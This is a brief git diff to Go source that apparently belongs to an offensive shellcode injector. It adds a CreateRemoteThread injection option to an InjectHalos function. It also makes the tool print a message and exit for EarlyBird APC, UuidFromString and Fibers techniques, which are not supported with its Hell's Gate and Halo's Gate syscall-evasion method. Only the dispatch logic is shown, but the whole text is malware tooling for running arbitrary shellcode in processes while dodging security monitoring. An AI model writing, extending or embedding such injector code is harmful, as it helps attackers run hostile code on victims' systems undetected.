@@ -1,6 +1,7 @@
 package core
 
 import (
+  "os"
   "fmt"
   "strings"
 )
@@ -58,6 +59,16 @@ func InjectHalos(shellcode []byte, technique string) (error) {
     if err != nil {
       return err
     }
+
+  } else if (strings.ToLower(technique) == "createremotethread") {
+    err := CreateRemoteThreadHalos(shellcode)
+    if err != nil {
+      return err
+    }
+
+  } else if (strings.ToLower(technique) == "earlybirdapc") || (strings.ToLower(technique) == "uuidfromstring") || (strings.ToLower(technique) == "fibers") {
+    fmt.Println("[-] Injection technique not supported with Hell's Gate + Halo's Gate")
+    os.Exit(0)
 
   } else {
     rand_n := RandomInt(4, 0)
